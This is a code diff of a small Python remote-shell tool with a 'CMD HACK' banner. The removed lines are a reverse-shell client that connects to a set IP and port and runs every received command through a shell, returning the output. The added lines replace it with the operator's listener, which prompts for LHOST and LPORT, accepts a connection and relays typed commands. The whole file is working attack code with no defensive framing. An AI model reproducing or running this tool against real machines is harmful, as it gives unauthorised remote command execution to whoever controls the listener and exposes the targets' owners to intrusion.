@@ -1,7 +1,6 @@
 import socket
-import subprocess
 import os
-                               #can only read files ...cant download !!!
+
 os.system('cls')
 
 blue = '\x1b[34m'
@@ -11,31 +10,42 @@ cyan = '\x1b[36m'
 red2 = '\x1b[31m'
 stop = '\x1b[0m'
 
-ip = '127.0.0.1'                      #  Edit the ip_address
-port = 7878                           #  Edit the port
+print(f"""{red2}      ::::::::         :::   :::       :::::::::               :::    :::           :::        ::::::::       :::    ::: 
+    :+:    :+:       :+:+: :+:+:      :+:    :+:              :+:    :+:         :+: :+:     :+:    :+:      :+:   :+:   
+   +:+             +:+ +:+:+ +:+     +:+    +:+              +:+    +:+        +:+   +:+    +:+             +:+  +:+     
+  +#+             +#+  +:+  +#+     +#+    +:+              +#++:++#++       +#++:++#++:   +#+             +#++:++       
+ +#+             +#+       +#+     +#+    +#+              +#+    +#+       +#+     +#+   +#+             +#+  +#+       
+#+#    #+#      #+#       #+#     #+#    #+#              #+#    #+#       #+#     #+#   #+#    #+#      #+#   #+#       
+########       ###       ###     #########               ###    ###       ###     ###    ########       ###    ###       
+ 
+ {stop}""")
+
+ip = input(f'{blue}LHOST :{stop} ')
+print('\n')
+port = input(f'{blue}LPORT [default port: 7878] :{stop} ')
+print('\n')
 
 try:
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.connect((ip, port))
-    print(f'{green}*** connected to {ip} @ {port} ***{stop}')
+    server.bind((ip, int(port)))
+    print(f'{cyan}connecting...{stop}')
+    server.listen(2)
+    client, addr = server.accept()
+    print(f'{cyan}connected to {addr}{stop}')
 
 except Exception as e:
     print(f'{red}{e}{stop}')
 
 else:
-    try:
-        msg = server.recv(8192).decode('utf-8')
-        print(f'{green}{msg}{stop}')
+    cmdlet = input('$ ')    
+    try:        
+        while cmdlet != 'quit':
+            client.send(cmdlet.encode('utf-8'))
+            result = client.recv(8192).decode('utf-8')
+            print(f'{green}{result}{stop}')
+            cmdlet = input('$ ')
+        server.close
+        print(f'{red}Disconnected from {ip} @ {port}{stop}')
 
-        while msg != 'quit':
-            try:
-                msg = str(msg)
-                result = subprocess.check_output(msg, shell=True)
-                server.send(result)
-                msg = server.recv(8192).decode('utf-8')
-                print(f'{green}{msg}{stop}')
-            except Exception as e:
-                print(f'{red}{e}{stop}')
-        print(f'{green}Disconnected from {ip} !{stop}')
     except Exception as e1:
         print(f'{red}{e1}{stop}')
